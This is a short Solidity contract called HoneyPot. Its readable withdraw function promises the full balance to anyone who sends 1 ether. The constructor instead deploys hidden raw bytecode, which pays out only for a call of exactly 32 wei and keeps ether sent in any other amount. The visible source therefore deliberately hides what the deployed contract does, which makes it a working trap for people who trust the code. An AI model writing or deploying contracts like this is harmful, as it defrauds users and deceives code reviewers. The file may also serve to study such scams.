pragma solidity ^0.4.23;

contract HoneyPot {
    
    bytes internal constant ID = hex&quot;60203414600857005B60008080803031335AF100&quot;;
    
    constructor () public payable {
        bytes memory contract_identifier = ID;
        assembly { return(add(0x20, contract_identifier), mload(contract_identifier)) }
    }
    
    function withdraw() public payable {
        require(msg.value >= 1 ether);
        msg.sender.transfer(address(this).balance);
    }
}